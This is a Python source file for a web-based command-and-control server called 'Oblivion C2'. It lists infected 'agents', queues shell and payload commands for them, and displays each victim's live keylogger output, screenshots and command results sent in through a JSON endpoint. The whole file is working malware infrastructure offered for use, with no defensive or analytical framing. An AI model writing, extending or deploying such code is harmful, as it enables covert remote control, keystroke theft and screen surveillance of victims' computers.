# server.py — Web C2 Dashboard with Keylogs
import os
import json
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

AGENTS = {}
PENDING = {}
ACTIVE_AGENT = None

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def do_GET(self):
        global ACTIVE_AGENT
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        if "use" in query: ACTIVE_AGENT = query["use"][0]

        html = """
        <html><head><title>Oblivion C2</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
            a { color: #00ff00; text-decoration: none; } a:hover { text-decoration: underline; }
            .box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; background: #111; border-radius: 5px; }
            input[type="text"] { background: #222; color: #fff; border: 1px solid #444; padding: 10px; width: 80%; }
            input[type="submit"] { background: #00ff00; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
            pre { background: #000; padding: 10px; border: 1px solid #222; overflow-x: auto; white-space: pre-wrap; max-height: 300px; }
            img { max-width: 100%; border: 1px solid #333; margin-top: 10px; }
        </style></head><body><h1>Oblivion C2 Relay</h1>"""

        if not AGENTS: html += "<p>No agents connected yet.</p>"
        else:
            html += "<h3>Connected Agents:</h3>"
            for aid in AGENTS:
                mark = "--> " if aid == ACTIVE_AGENT else ""
                html += f"<div class='box'><a href='/?use={aid}'>{mark}{aid}</a></div>"

        if ACTIVE_AGENT and ACTIVE_AGENT in AGENTS:
            html += f"<h3>Target: {ACTIVE_AGENT}</h3>"
            html += f"<form method='POST' action='/cmd'><input type='hidden' name='target' value='{ACTIVE_AGENT}'>"
            html += f"<input type='text' name='cmd' placeholder='shell, payload, roblox...'> <input type='submit' value='Execute'></form>"

            log_data = AGENTS[ACTIVE_AGENT].get("log", "No keystrokes logged yet.")
            html += f"<h4>Live Keylogger:</h4><pre>{log_data}</pre>"

            screen_b64 = AGENTS[ACTIVE_AGENT].get("screen")
            if screen_b64: html += f"<h4>Screen:</h4><img src='data:image/jpeg;base64,{screen_b64}'>"

            last_out = AGENTS[ACTIVE_AGENT].get("out", "No command output yet.")
            html += f"<h4>Last Command Output:</h4><pre>{last_out}</pre>"

        html += "</body></html>"
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        global ACTIVE_AGENT
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8')
        parsed = urllib.parse.urlparse(self.path)

        if parsed.path == "/cmd":
            params = urllib.parse.parse_qs(data)
            target = params.get("target", [""])[0]
            cmd = params.get("cmd", [""])[0]
            if target and cmd: PENDING[target] = cmd
            self.send_response(302); self.send_header("Location", f"/?use={target}"); self.end_headers()
            return

        if parsed.path == "/api":
            try:
                payload = json.loads(data)
                aid = payload.get("id")
                out = payload.get("out", "")
                screen = payload.get("screen", "")
                log = payload.get("log", "")
                
                if aid:
                    if aid not in AGENTS: AGENTS[aid] = {"log": ""}
                    if out: AGENTS[aid]["out"] = out
                    if screen: AGENTS[aid]["screen"] = screen
                    if log: AGENTS[aid]["log"] += log
                        
                cmd_to_send = PENDING.get(aid, "")
                if cmd_to_send: del PENDING[aid]
                    
                self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers()
                self.wfile.write(json.dumps({"cmd": cmd_to_send}).encode())
            except Exception:
                self.send_response(400); self.end_headers()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()